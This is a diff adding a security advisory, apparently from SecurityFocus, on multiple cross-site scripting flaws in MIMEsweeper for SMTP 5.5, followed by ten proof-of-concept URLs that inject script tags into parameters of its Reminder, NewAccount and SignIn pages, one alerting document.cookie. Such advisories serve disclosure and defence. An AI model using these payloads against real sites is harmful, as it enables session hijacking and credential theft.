@@ -1,0 +1,18 @@
+source: http://www.securityfocus.com/bid/58012/info
+
+MIMEsweeper for SMTP is prone to multiple cross-site scripting vulnerabilities because it fails to sanitize user-supplied input. 
+
+An attacker may leverage these issues to execute arbitrary script code in the browser of an unsuspecting user in the context of the affected site. This may allow the attacker to steal cookie-based authentication credentials and launch other attacks. 
+
+MIMEsweeper For SMTP 5.5 is vulnerable; other versions may also be affected.
+
+https://www.example.com/MSWPMM/Common/Reminder.aspx?email=test<script>alert(document.cookie)</script> 
+http://www.example.com/MSWPMM/Common/NewAccount.aspx?email=<script>alert("xss")</script> 
+http://www.example.com/MSWPMM/Common/NewAccount.aspx?ddlCulture=<script>alert("xss")</script> 
+http://www.example.com/MSWPMM/Common/NewAccount.aspx?btnCreateAccount=<script>alert("xss")</script> 
+http://www.example.com/MSWPMM/Common/NewAccount.aspx?btnCancel=<script>alert("xss")</script> 
+http://www.example.com/MSWPMM/Common/SignIn.aspx?tbEmailAddress=<script>alert("xss")</script>ReturnUrl=%2fMSWPMM%2fCommon%2fdefault.aspx 
+http://www.example.com/MSWPMM/Common/SignIn.aspx?tbPassword=<script>alert("xss")</script>ReturnUrl=%2fMSWPMM%2fCommon%2fdefault.aspx 
+http://www.example.com/MSWPMM/Common/SignIn.aspx?cbAutoSignIn="<script>alert("xss")</script> 
+http://www.example.com/MSWPMM/Common/SignIn.aspx?btnSignIn=<script>alert("xss")</script>ReturnUrl=%2fMSWPMM%2fCommon%2fdefault.aspx 
+http://www.example.com/MSWPMM/Common/SignIn.aspx?reason=<script>alert("xss")</script>
